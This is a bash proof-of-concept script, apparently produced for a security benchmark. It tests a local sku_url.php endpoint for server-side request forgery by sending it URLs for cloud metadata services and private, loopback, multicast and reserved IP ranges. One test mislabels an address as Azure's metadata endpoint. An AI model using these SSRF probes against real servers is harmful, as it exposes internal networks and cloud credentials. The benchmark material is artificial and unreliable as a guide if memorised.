#!/bin/bash
# POC: Demonstrates SSRF vulnerability in sku_url.php by attempting to access private IP ranges and cloud metadata endpoints that should be blocked but aren't
# Target: ./repo
# Created: 2025-12-02T16:27:23.313Z
# Session: benchmark-XBEN-092-24-miorxl1g

# SSRF IP Range Blocking Bypass POC
# Tests the sku_url.php endpoint for missing IP range validation
# The endpoint should block access to private networks and cloud metadata
# but fails to do so because it only checks for '127.0.0.1' and 'localhost'

TARGET_URL="http://localhost:8080"
ENDPOINT="/app/sku_url.php"

echo "=========================================="
echo "SSRF IP Range Blocking Bypass POC"
echo "=========================================="
echo ""

# Test Case 1: AWS Metadata Endpoint (169.254.169.254)
echo "[*] Test 1: AWS EC2 Metadata Endpoint (169.254.169.254:4455)"
echo "    Testing: http://169.254.169.254:4455/latest/meta-data/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "url=http://169.254.169.254:4455/latest/meta-data/" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "Access to this IP range is denied\|Invalid IP\|blocked\|denied"; then
  echo "    Result: BLOCKED (Good)"
else
  echo "    Result: POTENTIALLY EXPLOITABLE (Bad) - IP range not blocked"
fi
echo ""

# Test Case 2: Private Network 10.x.x.x
echo "[*] Test 2: Private Network 10.0.0.0/8 (10.0.1.100:4455)"
echo "    Testing: http://10.0.1.100:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "url=http://10.0.1.100:4455/" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "Access to this IP range is denied\|Invalid IP\|blocked\|denied"; then
  echo "    Result: BLOCKED (Good)"
else
  echo "    Result: POTENTIALLY EXPLOITABLE (Bad) - Private range 10.x.x.x not blocked"
fi
echo ""

# Test Case 3: Private Network 172.16.x.x
echo "[*] Test 3: Private Network 172.16.0.0/12 (172.16.50.10:4455)"
echo "    Testing: http://172.16.50.10:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "url=http://172.16.50.10:4455/" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "Access to this IP range is denied\|Invalid IP\|blocked\|denied"; then
  echo "    Result: BLOCKED (Good)"
else
  echo "    Result: POTENTIALLY EXPLOITABLE (Bad) - Private range 172.16.x.x not blocked"
fi
echo ""

# Test Case 4: Private Network 192.168.x.x
echo "[*] Test 4: Private Network 192.168.0.0/16 (192.168.1.50:4455)"
echo "    Testing: http://192.168.1.50:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "url=http://192.168.1.50:4455/" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "Access to this IP range is denied\|Invalid IP\|blocked\|denied"; then
  echo "    Result: BLOCKED (Good)"
else
  echo "    Result: POTENTIALLY EXPLOITABLE (Bad) - Private range 192.168.x.x not blocked"
fi
echo ""

# Test Case 5: Azure Metadata Endpoint (169.254.169.253)
echo "[*] Test 5: Azure Metadata Endpoint (169.254.169.253:4455)"
echo "    Testing: http://169.254.169.253:4455/metadata/instance"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "url=http://169.254.169.253:4455/metadata/instance" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "Access to this IP range is denied\|Invalid IP\|blocked\|denied"; then
  echo "    Result: BLOCKED (Good)"
else
  echo "    Result: POTENTIALLY EXPLOITABLE (Bad) - Link-local/metadata range not blocked"
fi
echo ""

# Test Case 6: Loopback range via non-standard format (127.0.0.2)
echo "[*] Test 6: Loopback Range 127.0.0.0/8 (127.0.0.2:4455)"
echo "    Testing: http://127.0.0.2:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "url=http://127.0.0.2:4455/" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "Access to this IP range is denied\|Invalid IP\|blocked\|denied"; then
  echo "    Result: BLOCKED (Good)"
else
  echo "    Result: POTENTIALLY EXPLOITABLE (Bad) - Loopback range not blocked"
fi
echo ""

# Test Case 7: Multicast range (224.0.0.1)
echo "[*] Test 7: Multicast Range 224.0.0.0/4 (224.0.0.1:4455)"
echo "    Testing: http://224.0.0.1:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "url=http://224.0.0.1:4455/" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "Access to this IP range is denied\|Invalid IP\|blocked\|denied"; then
  echo "    Result: BLOCKED (Good)"
else
  echo "    Result: POTENTIALLY EXPLOITABLE (Bad) - Multicast range not blocked"
fi
echo ""

# Test Case 8: Reserved range (240.0.0.1)
echo "[*] Test 8: Reserved Range 240.0.0.0/4 (240.0.0.1:4455)"
echo "    Testing: http://240.0.0.1:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "url=http://240.0.0.1:4455/" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "Access to this IP range is denied\|Invalid IP\|blocked\|denied"; then
  echo "    Result: BLOCKED (Good)"
else
  echo "    Result: POTENTIALLY EXPLOITABLE (Bad) - Reserved range not blocked"
fi
echo ""

echo "=========================================="
echo "POC Complete - Check results above"
echo "=========================================="